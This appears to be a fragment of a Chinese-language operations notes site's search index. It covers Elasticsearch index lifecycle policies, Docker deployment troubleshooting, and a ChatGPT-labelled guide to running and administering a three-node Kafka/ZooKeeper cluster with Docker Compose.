\u7b2c\u4e00\u6b65\uff0c\u521b\u5efa\u751f\u547d\u5468\u671f\u7ba1\u7406\u7b56\u7565\nPUT /_ilm/policy/clean_index_7days\n{\n  \"policy\": {\n    \"phases\": {\n      \"delete\": {\n        \"min_age\": \"7d\",\n        \"actions\": {\n          \"delete\": {}\n        }\n      }\n    }\n  }\n}\n\nGET /_ilm/policy/clean_index_7days\n\n# \u7b2c\u4e8c\u6b65\uff0c\u521b\u5efa\u6a21\u677f\nPUT /_template/demo\n{\n  \"index_patterns\": [\"demo-*\"],\n  \"order\": 1,\n  \"settings\": {\n    \"number_of_shards\": 1,\n    \"number_of_replicas\": 1,\n    \"index.lifecycle.name\": \"clean_index_7days\"\n  }\n}\n\nGET /_template/demo\n\n# \u7b2c\u4e09\u6b65\uff0c\u7ed1\u5b9a\u7d22\u5f15\u548c\u7b56\u7565\uff08\u5df2\u7ecf\u4ea7\u751f\u7684\u7d22\u5f15\u4e0d\u4f1a\u81ea\u52a8\u7ed1\u5b9a\uff09\nPUT /demo-json-2023.01.01/_settings\n{\n    \"index\" : {\n        \"lifecycle\" : {\n            \"name\" : \"clean_index_7days\"\n        }\n    }\n}\n\nGET /demo-json-2023.01.01/_ilm/explain\n\n# \u7b2c\u56db\u6b65\uff0c\u8c03\u6574\u68c0\u6d4b\u7b56\u7565\nPUT /_cluster/settings\n{\n  \"transient\": {\n    \"indices.lifecycle.poll_interval\": \"10s\"\n  }\n}\n\nGET /_cluster/settings\n</code></pre> <p>\u533a\u5206 HOT / WARM /DELETE \u5b58\u50a8</p> <pre><code>PUT _ilm/policy/clean_index_7days\n{\n  \"policy\": {\n    \"phases\": {\n      \"hot\": {\n        \"min_age\": \"0ms\",\n        \"actions\": {}\n      },\n      \"warm\": {\n        \"min_age\": \"2d\",\n        \"actions\": {\n          \"allocate\": {\n            \"number_of_replicas\": 0\n          }\n        }\n      },\n      \"delete\": {\n        \"min_age\": \"8d\",\n        \"actions\": {\n          \"delete\": {\n            \"delete_searchable_snapshot\": true\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre>"},{"location":"kubernetes/25-elastic/#_2","title":"\u4e94\u3001\u5e38\u89c1\u95ee\u9898","text":""},{"location":"kubernetes/25-elastic/#51-ilm","title":"5.1 ILM\u51fa\u73b0\u9519\u8bef","text":"<p>\u73b0\u8c61</p> <pre><code>illegal_argument_exception: index.lifecycle.rollover_alias [demo] does not point to index [demo-2023.01.05]\n\nillegal_argument_exception: rollover target [logs] does not point to a write index\n\nillegal_argument_exception: setting [index.lifecycle.rollover_alias] for index [demo-2023.01.05] is empty or not defined\n</code></pre> <p>\u539f\u56e0</p> <ul> <li>\u542f\u7528\u6eda\u52a8\u66f4\u65b0\u9700\u8981\u4e3a\u6bcf\u4e2a\u7d22\u5f15\u8bbe\u7f6e\u522b\u540d\uff0c\u6309\u5929\u5206\u5272\u7684\u7d22\u5f15\u4e0d\u9002\u5408\u52a8\u6001\u8bbe\u7f6e\u522b\u540d\u3002</li> </ul> <p>\u89e3\u51b3</p> <ul> <li>\u5148\u79fb\u9664\u65e7\u7b56\u7565\uff0c\u518d\u7ed1\u5b9a\u65b0\u7b56\u7565\uff08\u76f4\u63a5\u66ff\u6362\u4e0d\u751f\u6548\uff09\u3002</li> </ul>"},{"location":"kubernetes/25-elastic/#52-docker","title":"5.2 docker\u90e8\u7f72\u95ee\u9898","text":"<pre><code>1\uff0c\u6302\u8f7d\u6570\u636e\u7684\u65f6\u5019\u51fa\u73b0\u8bbf\u95ee\u53d7\u9650\u4ee5\u81f3\u4e8e\u65e0\u6cd5\u542f\u52a8\u65f6\uff0c\u53ef\u5c06\u6302\u8f7d\u6570\u636e\u7684\u76ee\u5f55\u6240\u6709\u8005\u548c\u7528\u6237\u7ec4\u6539\u4e3a elastic \u524d\u63d0\u6761\u4ef6\u5f97\u5148\u521b\u5efa\u7528\u6237\u548c\u7528\u6237\u7ec4,\u7701\u4e8b\u4e00\u70b9\u5c31\u76f4\u63a5 chown -R 1000:1000 /home/elasticsearch/data\n2\uff0c\u5728\u8fd0\u884celasticsearch\u65f6\u51fa\u73b0 max virtual memory areas vm.max_map_count [65530], \u8bf7\u5728\u5bbf\u4e3b\u673a\u4e2d\u6267\u884c: sudo sysctl -w vm.max_map_count=262144 \u6216\u8005\u8fd0\u884csudo vi /etc/sysctl.conf\u5728\u6587\u4ef6\u4e2d\u8ffd\u52a0vm.max_map_count=262144 \u4fdd\u5b58\u540e\u6267\u884csudo sysctl -p\n3\uff0ccluster.initial_master_nodes \u4e3a\u96c6\u7fa4\u521b\u5efa\u521d\u671f\u5177\u6709master\u9009\u4e3e\u6743\u7684\u8282\u70b9\u3002\n4\uff0cdiscovery.seed_hosts \u53d1\u9001\u4fe1\u606f\u7ed9\u5177\u6709master\u9009\u4e3e\u6743\u7684\u8282\u70b9\uff0c\u5982\u679c\u5f53\u524d\u8282\u70b9\u5177\u6709master\u8282\u70b9\u7684\u9009\u4e3e\u6743\uff0c\u5219\u9700\u8981\u5411\u5176\u4ed6\u540c\u6837\u5177\u6709master\u8282\u70b9\u9009\u4e3e\u6743\u7684\u53d1\u9001\u6d88\u606f\u3002\u5982\u679c\u65e0master \u8282\u70b9\u9009\u4e3e\u6743\uff0c\u5219\u987b\u628a\u6240\u6709\u5177\u6709master\u9009\u4e3e\u6743\u7684\u8282\u70b9host \u52a0\u5165\u3002\n5\uff0c\u96c6\u7fa4master\u8282\u70b9\u987b\u5927\u4e8e\u7b49\u4e8e3\u4e2a\uff0c\u56e0\u4e3a\u5982\u679c\u5f53\u524d\u4e3b\u8282\u70b9\u6302\u4e86\u4e4b\u540ees\u987b\u4ece\u5177\u6709master \u9009\u4e3e\u6743\u7684\u8282\u70b9\u4e2d\u91cd\u65b0\u9009\u4e3e\u51fa\u65b0\u7684\u4e3b\u8282\u70b9\uff0c\u5982\u679c\u5177\u6709master \u9009\u4e3e\u6743\u7684\u8282\u70b9\u5b58\u6d3b\u5c11\u4e8e\u4e00\u534a\u65f6\uff0c\u8282\u70b9\u662f\u65e0\u6cd5\u5b8c\u6210\u9009\u4e3e\u7684\uff0c\u6240\u4ee5\u5fc5\u987b\u6709\u5927\u4e8e\u4e00\u534a\u4ee5\u4e0a\u4e14\u5177\u6709master\u9009\u4e3e\u6743\u7684\u8282\u70b9\u5b58\u5728\u65f6es\u624d\u80fd\u91cd\u65b0\u9009\u4e3e\u51fa\u65b0\u7684\u4e3b\u8282\u70b9\u3002\u4e0d\u7136\u8282\u70b9\u65e0\u6cd5\u5de5\u4f5c\u3002\n6\uff0celasticsearch.yml\u91cc\u7684\u914d\u7f6e\u90fd\u53ef\u5728docker-compose.yml\u4e2denvironment\u91cc\u8986\u76d6\u3002\n</code></pre>"},{"location":"kubernetes/25-elastic/#docker","title":"\u516d\u3001Docker\u5b9e\u8df5","text":""},{"location":"kubernetes/25-elastic/#61-chatgpt","title":"6.1 ChatGPT","text":"<p>\u5728\u4e09\u53f0 Docker \u673a\u5668\u4e0a\u642d\u5efa\u4e00\u4e2a Kafka \u96c6\u7fa4\u9700\u8981\u914d\u7f6e ZooKeeper \u96c6\u7fa4\u548c Kafka \u96c6\u7fa4\u3002ZooKeeper \u7528\u4e8e\u7ba1\u7406 Kafka \u96c6\u7fa4\u7684\u5143\u6570\u636e\u3002\u4ee5\u4e0b\u662f\u8be6\u7ec6\u6b65\u9aa4\u3002</p>"},{"location":"kubernetes/25-elastic/#611","title":"6.1.1 \u73af\u5883\u51c6\u5907","text":"<p>\u5047\u8bbe\u4f60\u6709\u4e09\u53f0 Docker \u673a\u5668\uff0c\u5206\u522b\u662f <code>machine1</code>\u3001<code>machine2</code> \u548c <code>machine3</code>\uff0c\u5e76\u4e14\u4f60\u5df2\u7ecf\u5b89\u88c5\u4e86 Docker \u548c Docker Compose\u3002</p> <ol> <li>ZooKeeper \u96c6\u7fa4\u914d\u7f6e</li> </ol> <p>\u9996\u5148\uff0c\u4e3a\u6bcf\u53f0\u673a\u5668\u521b\u5efa ZooKeeper \u7684 Docker Compose \u6587\u4ef6 <code>docker-compose-zookeeper.yml</code>\u3002</p> <p>machine1 (ZooKeeper1)</p> <pre><code>version: '3'\nservices:\n  zookeeper:\n    image: zookeeper:3.7.1\n    container_name: zookeeper1\n    ports:\n      - \"2181:2181\"\n    environment:\n      ZOO_MY_ID: 1\n      ZOO_SERVERS: server.1=machine1:2888:3888;2181 server.2=machine2:2888:3888;2181 server.3=machine3:2888:3888;2181\n</code></pre> <p>machine2 (ZooKeeper2)</p> <pre><code>version: '3'\nservices:\n  zookeeper:\n    image: zookeeper:3.7.1\n    container_name: zookeeper2\n    ports:\n      - \"2181:2181\"\n    environment:\n      ZOO_MY_ID: 2\n      ZOO_SERVERS: server.1=machine1:2888:3888;2181 server.2=machine2:2888:3888;2181 server.3=machine3:2888:3888;2181\n</code></pre> <p>machine3 (ZooKeeper3)</p> <pre><code>version: '3'\nservices:\n  zookeeper:\n    image: zookeeper:3.7.1\n    container_name: zookeeper3\n    ports:\n      - \"2181:2181\"\n    environment:\n      ZOO_MY_ID: 3\n      ZOO_SERVERS: server.1=machine1:2888:3888;2181 server.2=machine2:2888:3888;2181 server.3=machine3:2888:3888;2181\n</code></pre> <p>\u542f\u52a8\u6bcf\u53f0\u673a\u5668\u4e0a\u7684 ZooKeeper \u5bb9\u5668\uff1a</p> <pre><code>docker-compose -f docker-compose-zookeeper.yml up -d\n</code></pre> <ol> <li>Kafka \u96c6\u7fa4\u914d\u7f6e</li> </ol> <p>\u4e3a\u6bcf\u53f0\u673a\u5668\u521b\u5efa Kafka \u7684 Docker Compose \u6587\u4ef6 <code>docker-compose-kafka.yml</code>\u3002</p> <p>machine1 (Kafka1)</p> <pre><code>version: '3'\nservices:\n  kafka:\n    image: wurstmeister/kafka:latest\n    container_name: kafka1\n    ports:\n      - \"9092:9092\"\n    environment:\n      KAFKA_BROKER_ID: 1\n      KAFKA_ZOOKEEPER_CONNECT: machine1:2181,machine2:2181,machine3:2181\n      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://machine1:9092\n      KAFKA_LISTENERS: PLAINTEXT://0.0.0.0:9092\n      KAFKA_LOG_DIRS: /kafka/kafka-logs\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n</code></pre> <p>machine2 (Kafka2)</p> <pre><code>version: '3'\nservices:\n  kafka:\n    image: wurstmeister/kafka:latest\n    container_name: kafka2\n    ports:\n      - \"9092:9092\"\n    environment:\n      KAFKA_BROKER_ID: 2\n      KAFKA_ZOOKEEPER_CONNECT: machine1:2181,machine2:2181,machine3:2181\n      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://machine2:9092\n      KAFKA_LISTENERS: PLAINTEXT://0.0.0.0:9092\n      KAFKA_LOG_DIRS: /kafka/kafka-logs\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n</code></pre> <p>machine3 (Kafka3)</p> <pre><code>version: '3'\nservices:\n  kafka:\n    image: wurstmeister/kafka:latest\n    container_name: kafka3\n    ports:\n      - \"9092:9092\"\n    environment:\n      KAFKA_BROKER_ID: 3\n      KAFKA_ZOOKEEPER_CONNECT: machine1:2181,machine2:2181,machine3:2181\n      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://machine3:9092\n      KAFKA_LISTENERS: PLAINTEXT://0.0.0.0:9092\n      KAFKA_LOG_DIRS: /kafka/kafka-logs\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n</code></pre> <p>\u542f\u52a8\u6bcf\u53f0\u673a\u5668\u4e0a\u7684 Kafka \u5bb9\u5668\uff1a</p> <pre><code>docker-compose -f docker-compose-kafka.yml up -d\n</code></pre> <ol> <li>\u9a8c\u8bc1\u96c6\u7fa4</li> </ol> <p>\u4f7f\u7528 <code>kafka-topics.sh</code> \u5de5\u5177\u9a8c\u8bc1 Kafka \u96c6\u7fa4\u662f\u5426\u6b63\u5e38\u5de5\u4f5c\u3002</p> <p>\u521b\u5efa\u6d4b\u8bd5\u4e3b\u9898</p> <p>\u5728\u4efb\u610f\u4e00\u53f0\u673a\u5668\u4e0a\u8fd0\u884c\uff1a</p> <pre><code>docker exec -it kafka1 kafka-topics.sh --create --topic test-topic --bootstrap-server machine1:9092,machine2:9092,machine3:9092 --replication-factor 3 --partitions 1\n</code></pre> <p>\u67e5\u770b\u4e3b\u9898\u5217\u8868</p> <p>\u5728\u4efb\u610f\u4e00\u53f0\u673a\u5668\u4e0a\u8fd0\u884c\uff1a</p> <pre><code>docker exec -it kafka1 kafka-topics.sh --list --bootstrap-server machine1:9092,machine2:9092,machine3:9092\n</code></pre> <p>\u603b\u7ed3</p> <p>\u901a\u8fc7\u4ee5\u4e0a\u6b65\u9aa4\uff0c\u4f60\u5df2\u7ecf\u6210\u529f\u5728\u4e09\u53f0 Docker \u673a\u5668\u4e0a\u642d\u5efa\u4e86\u4e00\u4e2a Kafka \u96c6\u7fa4\u3002\u6b64\u96c6\u7fa4\u5305\u542b\u4e09\u53f0 ZooKeeper \u670d\u52a1\u5668\u548c\u4e09\u53f0 Kafka \u4ee3\u7406\uff0c\u80fd\u591f\u63d0\u4f9b\u9ad8\u53ef\u7528\u6027\u548c\u6269\u5c55\u6027\u3002\u6839\u636e\u9700\u8981\uff0c\u4f60\u53ef\u4ee5\u8fdb\u4e00\u6b65\u8c03\u6574\u548c\u4f18\u5316\u914d\u7f6e\uff0c\u4ee5\u6ee1\u8db3\u5177\u4f53\u7684\u751f\u4ea7\u9700\u6c42\u3002</p>"},{"location":"kubernetes/25-elastic/#612-topic-cosumer","title":"6.1.2 \u67e5\u770b topic &amp; cosumer","text":"<p>\u8981\u67e5\u770b Kafka topic \u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u53ef\u4ee5\u4f7f\u7528 Kafka \u63d0\u4f9b\u7684\u547d\u4ee4\u884c\u5de5\u5177 <code>kafka-topics.sh</code> \u548c <code>kafka-consumer-groups.sh</code>\u3002\u8fd9\u4e9b\u5de5\u5177\u53ef\u4ee5\u663e\u793a topic \u7684\u914d\u7f6e\u3001\u5206\u533a\u4fe1\u606f\u3001\u526f\u672c\u72b6\u6001\u7b49\u8be6\u7ec6\u4fe1\u606f\u3002\u4ee5\u4e0b\u662f\u5177\u4f53\u7684\u547d\u4ee4\u548c\u6b65\u9aa4\uff1a</p> <p>\u4f7f\u7528 <code>kafka-topics.sh</code> \u67e5\u770b topic \u8be6\u60c5</p> <p>\u9996\u5148\uff0c\u786e\u4fdd\u4f60\u5df2\u7ecf\u8fde\u63a5\u5230 Kafka \u96c6\u7fa4\uff0c\u5e76\u4e14 Kafka bin \u76ee\u5f55\u5728\u4f60\u7684\u73af\u5883\u53d8\u91cf\u4e2d\u3002\u5982\u679c\u6ca1\u6709\uff0c\u53ef\u4ee5\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u8bbf\u95ee <code>kafka-topics.sh</code>\u3002</p> <p>\u67e5\u770b topic \u5217\u8868</p> <p>\u67e5\u770b\u96c6\u7fa4\u4e2d\u6240\u6709\u7684 topic\uff1a</p> <pre><code>kafka-topics.sh --list --bootstrap-server &lt;broker_address&gt;\n</code></pre> <p>\u4f8b\u5982\uff1a</p> <pre><code>sh\n\u590d\u5236\u4ee3\u7801\nkafka-topics.sh --list --bootstrap-server localhost:9092\n</code></pre> <p>\u67e5\u770b\u5355\u4e2a topic \u7684\u8be6\u7ec6\u4fe1\u606f</p> <p>\u67e5\u770b\u67d0\u4e2a\u7279\u5b9a topic \u7684\u8be6\u7ec6\u4fe1\u606f\uff1a</p> <pre><code>kafka-topics.sh --describe --topic &lt;topic_name&gt; --bootstrap-server &lt;broker_address&gt;\n</code></pre> <p>\u4f8b\u5982\uff0c\u67e5\u770b <code>test-topic</code> \u7684\u8be6\u7ec6\u4fe1\u606f\uff1a</p> <pre><code>kafka-topics.sh --describe --topic test-topic --bootstrap-server localhost:9092\n</code></pre> <p>\u8f93\u51fa\u793a\u4f8b\uff1a</p> <pre><code>Topic: test-topic  PartitionCount: 1  ReplicationFactor: 3  Configs: segment.bytes=1073741824\n  Topic: test-topic  Partition: 0  Leader: 1  Replicas: 1,2,3  Isr: 1,2,3\n</code></pre> <p>\u89e3\u91ca\u8f93\u51fa\u4fe1\u606f</p> <ul> <li>Topic: topic \u7684\u540d\u79f0\u3002</li> <li>PartitionCount: topic \u7684\u5206\u533a\u6570\u3002</li> <li>ReplicationFactor: topic \u7684\u526f\u672c\u56e0\u5b50\u3002</li> <li>Configs: topic \u7684\u914d\u7f6e\u3002</li> <li>Partition: \u5206\u533a\u7f16\u53f7\u3002</li> <li>Leader: \u8be5\u5206\u533a\u7684 Leader broker ID\u3002</li> <li>Replicas: \u8be5\u5206\u533a\u7684\u526f\u672c broker ID \u5217\u8868\u3002</li> <li>Isr: \u540c\u6b65\u526f\u672c\uff08in-sync replicas\uff09\u7684 broker ID \u5217\u8868\u3002</li> </ul> <p>\u4f7f\u7528 <code>kafka-consumer-groups.sh</code> \u67e5\u770b\u6d88\u8d39\u8005\u7ec4\u4fe1\u606f</p> <p>\u9664\u4e86\u67e5\u770b topic \u7684\u4fe1\u606f\uff0c\u4f60\u8fd8\u53ef\u4ee5\u67e5\u770b\u6d88\u8d39\u8005\u7ec4\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>\u5217\u51fa\u6d88\u8d39\u8005\u7ec4</p> <p>\u5217\u51fa\u6240\u6709\u6d88\u8d39\u8005\u7ec4\uff1a</p> <pre><code>kafka-consumer-groups.sh --list --bootstrap-server &lt;broker_address&gt;\n</code></pre> <p>\u4f8b\u5982\uff1a</p> <pre><code>kafka-consumer-groups.sh --list --bootstrap-server localhost:9092\n</code></pre> <p>\u67e5\u770b\u6d88\u8d39\u8005\u7ec4\u8be6\u7ec6\u4fe1\u606f</p> <p>\u67e5\u770b\u67d0\u4e2a\u6d88\u8d39\u8005\u7ec4\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u6bcf\u4e2a\u5206\u533a\u7684\u504f\u79fb\u91cf\u7b49\uff1a</p> <pre><code>kafka-consumer-groups.sh --describe --group &lt;group_name&gt; --bootstrap-server &lt;broker_address&gt;\n</code></pre> <p>\u4f8b\u5982\uff0c\u67e5\u770b <code>test-group</code> \u7684\u8be6\u7ec6\u4fe1\u606f\uff1a</p> <pre><code>kafka-consumer-groups.sh --describe --group test-group --bootstrap-server localhost:9092\n</code></pre> <p>\u8f93\u51fa\u793a\u4f8b\uff1a</p> <pre><code>GROUP           TOPIC           PARTITION  CURRENT-OFFSET  LOG-END-OFFSET  LAG             CONSUMER-ID        HOST            CLIENT-ID\ntest-group      test-topic      0          5               10              5               consumer-1         /127.0.0.1      consumer-1\n</code></pre> <p>\u89e3\u91ca\u8f93\u51fa\u4fe1\u606f</p> <ul> <li>GROUP: \u6d88\u8d39\u8005\u7ec4\u540d\u79f0\u3002</li> <li>TOPIC: \u6d88\u8d39\u7684 topic \u540d\u79f0\u3002</li> <li>PARTITION: topic \u7684\u5206\u533a\u7f16\u53f7\u3002</li> <li>CURRENT-OFFSET: \u5f53\u524d\u6d88\u8d39\u8005\u6d88\u8d39\u5230\u7684\u504f\u79fb\u91cf\u3002</li> <li>LOG-END-OFFSET: \u5206\u533a\u7684\u6700\u65b0\u504f\u79fb\u91cf\u3002</li> <li>LAG: \u5f53\u524d\u6d88\u8d39\u8005\u7684\u6ede\u540e\u91cf\uff08\u672a\u6d88\u8d39\u7684\u6d88\u606f\u6570\u91cf\uff09\u3002</li> <li>CONSUMER-ID: \u6d88\u8d39\u8005 ID\u3002</li> <li>HOST: \u6d88\u8d39\u8005\u6240\u5728\u7684\u4e3b\u673a\u3002</li> <li>CLIENT-ID: \u6d88\u8d39\u8005\u7684\u5ba2\u6237\u7aef ID\u3002</li> </ul> <p>\u793a\u4f8b</p> <p>\u5047\u8bbe\u4f60\u7684 Kafka broker \u5728 <code>localhost:9092</code>\uff0c\u5e76\u4e14\u4f60\u60f3\u67e5\u770b <code>my-topic</code> \u7684\u8be6\u7ec6\u4fe1\u606f\uff1a</p> <pre><code>kafka-topics.sh --describe --topic my-topic --bootstrap-server localhost:9092\n</code></pre> <p>\u5982\u679c\u4f60\u6709\u4e00\u4e2a\u6d88\u8d39\u8005\u7ec4 <code>my-group</code>\uff0c\u60f3\u67e5\u770b\u5176\u8be6\u7ec6\u4fe1\u606f\uff1a</p> <pre><code>kafka-consumer-groups.sh --describe --group my-group --bootstrap-server localhost:9092\n</code></pre> <p>\u901a\u8fc7\u8fd9\u4e9b\u547d\u4ee4\uff0c\u4f60\u53ef\u4ee5\u5168\u9762\u4e86\u89e3 Kafka topic \u548c\u6d88\u8d39\u8005\u7ec4\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u4ee5\u4fbf\u66f4\u597d\u5730\u7ba1\u7406\u548c\u8c03\u8bd5 Kafka \u96c6\u7fa4\u3002</p>"},{"location":"kubernetes/25-elastic/#613-topic-partition-replication","title":"6.1.3 \u53d8\u66f4topic partition replication","text":"<p>\u5728 Kafka \u4e2d\uff0c\u8c03\u6574 topic \u7684\u5206\u533a\u6570\u548c\u526f\u672c\u56e0\u5b50\u53ef\u4ee5\u5e2e\u52a9\u4f60\u6839\u636e\u9700\u8981\u8fdb\u884c\u6269\u5c55\u548c\u63d0\u9ad8\u6570\u636e\u7684\u5bb9\u9519\u6027\u3002\u4ee5\u4e0b\u662f\u8be6\u7ec6\u7684\u6b65\u9aa4\u548c\u547d\u4ee4\uff0c\u7528\u4e8e\u53d8\u66f4 Kafka topic \u7684\u5206\u533a\u6570\u548c\u526f\u672c\u56e0\u5b50\u3002</p> <p>\u589e\u52a0\u5206\u533a\u6570</p> <p>\u6ce8\u610f\uff1a\u4f60\u53ea\u80fd\u589e\u52a0\u5206\u533a\u6570\uff0c\u4e0d\u80fd\u51cf\u5c11\u3002\u589e\u52a0\u5206\u533a\u6570\u4f1a\u6539\u53d8\u6d88\u606f\u7684\u5206\u5e03\uff0c\u53ef\u80fd\u4f1a\u5f71\u54cd\u6d88\u606f\u7684\u987a\u5e8f\u3002</p> <p>\u4f7f\u7528 <code>kafka-topics.sh</code> \u589e\u52a0\u5206\u533a\u6570</p> <p>\u5047\u8bbe\u4f60\u8981\u5c06 <code>my-topic</code> \u7684\u5206\u533a\u6570\u589e\u52a0\u5230 5\uff1a</p> <pre><code>kafka-topics.sh --alter --topic my-topic --partitions 5 --bootstrap-server localhost:9092\n</code></pre> <p>\u8c03\u6574\u526f\u672c\u56e0\u5b50</p> <p>\u8c03\u6574\u526f\u672c\u56e0\u5b50\u7a0d\u5fae\u590d\u6742\u4e00\u4e9b\uff0c\u56e0\u4e3a\u4f60\u9700\u8981\u624b\u52a8\u6307\u5b9a\u5206\u533a\u7684\u526f\u672c\u5206\u5e03\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 <code>kafka-reassign-partitions.sh</code> \u5de5\u5177\u6765\u5b8c\u6210\u6b64\u4efb\u52a1\u3002</p> <ol> <li>\u751f\u6210\u5206\u533a\u91cd\u65b0\u5206\u914d\u8ba1\u5212</li> </ol> <p>\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6 <code>increase-replication-factor.json</code>\uff0c\u5176\u4e2d\u5305\u542b\u65b0\u7684\u5206\u533a\u5206\u914d\u8ba1\u5212\u3002\u5047\u8bbe\u4f60\u6709\u4e00\u4e2a 3 \u8282\u70b9\u7684 Kafka \u96c6\u7fa4\uff08broker1\u3001broker2\u3001broker3\uff09\uff0c\u5e76\u4e14\u4f60\u60f3\u5c06 <code>my-topic</code> \u7684\u526f\u672c\u56e0\u5b50\u4ece 1 \u589e\u52a0\u5230 3\u3002</p> <p>\u9996\u5148\uff0c\u751f\u6210\u5f53\u524d\u5206\u533a\u5206\u914d\u8ba1\u5212\uff1a</p> <pre><code>kafka-reassign-partitions.sh --zookeeper localhost:2181 --topics-to-move-json-file topics-to-move.json --broker-list \"1,2,3\" --generate\n</code></pre> <p><code>topics-to-move.json</code> \u5185\u5bb9\u793a\u4f8b\uff1a</p> <pre><code>{\n  \"version\":1,\n  \"topics\":[\n    {\n      \"topic\":\"my-topic\"\n    }\n  ]\n}\n</code></pre> <p>\u8fd9\u5c06\u751f\u6210\u4e00\u4e2a JSON \u8f93\u51fa\u6587\u4ef6\uff0c\u5305\u542b\u5f53\u524d\u548c\u5efa\u8bae\u7684\u5206\u533a\u5206\u914d\u8ba1\u5212\u3002</p> <ol> <li>\u4fee\u6539\u5206\u533a\u91cd\u65b0\u5206\u914d\u8ba1\u5212</li> </ol> <p>\u6839\u636e\u751f\u6210\u7684\u5efa\u8bae\uff0c\u7f16\u8f91 <code>increase-replication-factor.json</code> \u6587\u4ef6\uff0c\u4f7f\u5176\u7b26\u5408\u4f60\u7684\u9700\u6c42\u3002\u5047\u8bbe\u751f\u6210\u7684\u6587\u4ef6\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>{\n  \"version\": 1,\n  \"partitions\": [\n    {\n      \"topic\": \"my-topic\",\n      \"partition\": 0,\n      \"replicas\": [1, 2, 3]\n    },\n    {\n      \"topic\": \"my-topic\",\n      \"partition\": 1,\n      \"replicas\": [2, 3, 1]\n    },\n    {\n      \"topic\": \"my-topic\",\n      \"partition\": 2,\n      \"replicas\": [3, 1, 2]\n    }\n  ]\n}\n</code></pre> <p>\u786e\u4fdd\u6bcf\u4e2a\u5206\u533a\u7684 <code>replicas</code> \u5217\u8868\u4e2d\u5305\u542b\u65b0\u7684\u526f\u672c\u5206\u5e03\u3002</p> <ol> <li>\u6267\u884c\u5206\u533a\u91cd\u65b0\u5206\u914d\u8ba1\u5212</li> </ol> <p>\u4f7f\u7528 <code>kafka-reassign-partitions.sh</code> \u5de5\u5177\u6267\u884c\u65b0\u7684\u5206\u533a\u5206\u914d\u8ba1\u5212\uff1a</p> <pre><code>kafka-reassign-partitions.sh --zookeeper localhost:2181 --reassignment-json-file increase-replication-factor.json --execute\n</code></pre> <ol> <li>\u9a8c\u8bc1\u5206\u533a\u91cd\u65b0\u5206\u914d\u72b6\u6001</li> </ol> <p>\u4f60\u53ef\u4ee5\u9a8c\u8bc1\u91cd\u65b0\u5206\u914d\u8fc7\u7a0b\u662f\u5426\u5b8c\u6210\uff1a</p> <pre><code>kafka-reassign-partitions.sh --zookeeper localhost:2181 --reassignment-json-file increase-replication-factor.json --verify\n</code></pre> <p>\u793a\u4f8b\u5b8c\u6574\u6d41\u7a0b</p> <ol> <li>\u751f\u6210\u5206\u533a\u91cd\u65b0\u5206\u914d\u8ba1\u5212</li> </ol> <p>\u751f\u6210 <code>topics-to-move.json</code>\uff1a</p> <pre><code>{\n  \"version\":1,\n  \"topics\":[\n    {\n      \"topic\":\"my-topic\"\n    }\n  ]\n}\n</code></pre> <p>\u751f\u6210\u5f53\u524d\u5206\u533a\u5206\u914d\u8ba1\u5212\uff1a</p> <pre><code>kafka-reassign-partitions.sh --zookeeper localhost:2181 --topics-to-move-json-file topics-to-move.json --broker-list \"1,2,3\" --generate\n</code></pre> <p>\u8fd9\u5c06\u8f93\u51fa\u5efa\u8bae\u7684\u5206\u914d\u8ba1\u5212\u3002\u5c06\u5176\u590d\u5236\u5230 <code>increase-replication-factor.json</code>\u3002</p> <ol> <li>\u4fee\u6539\u5206\u533a\u91cd\u65b0\u5206\u914d\u8ba1\u5212</li> </ol> <p>\u7f16\u8f91 <code>increase-replication-factor.json</code> \u4f7f\u5176\u7b26\u5408\u4f60\u7684\u9700\u6c42\uff1a</p> <pre><code>{\n  \"version\": 1,\n  \"partitions\": [\n    {\n      \"topic\": \"my-topic\",\n      \"partition\": 0,\n      \"replicas\": [1, 2, 3]\n    },\n    {\n      \"topic\": \"my-topic\",\n      \"partition\": 1,\n      \"replicas\": [2, 3, 1]\n    },\n    {\n      \"topic\": \"my-topic\",\n      \"partition\": 2,\n      \"replicas\": [3, 1, 2]\n    }\n  ]\n}\n</code></pre> <ol> <li>\u6267\u884c\u5206\u533a\u91cd\u65b0\u5206\u914d\u8ba1\u5212</li> </ol> <pre><code>kafka-reassign-partitions.sh --zookeeper localhost:2181 --reassignment-json-file increase-replication-factor.json --execute\n</code></pre> <ol> <li>\u9a8c\u8bc1\u5206\u533a\u91cd\u65b0\u5206\u914d\u72b6\u6001</li> </ol> <pre><code>kafka-reassign-partitions.sh --zookeeper localhost:2181 --reassignment-json-file increase-replication-factor.json --verify\n</code></pre> <p>\u901a\u8fc7\u8fd9\u4e9b\u6b65\u9aa4\uff0c\u4f60\u53ef\u4ee5\u6210\u529f\u8c03\u6574 Kafka topic \u7684\u5206\u533a\u6570\u548c\u526f\u672c\u56e0\u5b50\u3002\u6ce8\u610f\uff0c\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u8fdb\u884c\u8fd9\u4e9b\u64cd\u4f5c\u524d\uff0c\u52a1\u5fc5\u505a\u597d\u5907\u4efd\u548c\u6d4b\u8bd5\u3002</p>"},{"location":"kubernetes/25-elastic/#614-topic","title":"6.1.4 \u5220\u9664topic","text":"<pre><code>kafka-topics.sh --delete --topic &lt;topic_name&gt; --bootstrap-server &lt;broker_address&gt;\n</code></pre>"},{"location":"kubernetes/25-elastic/#62","title":"6.2 \u5b9e\u8df5","text":""},{"location":"kubernetes/25-elastic/#621","title":"6.2.1 \u73af\u5883\u51c6\u5907","text":"<pre><code># ELK-DOCKER-01    10.131.1.237\n# ELK-DOCKER-02    10.131.1.224\n# ELK-DOCKER-03    10.131.1.209\n# \n# ELK-DOCKER-04    10.131.1.227\n\nmkdir -p /data1/lib/docker\nln -s /data1/lib/docker /var/lib/docker\n\nsystemctl enable docker\nsystemctl is-enabled docker\nsystemctl start docker\nsystemctl status 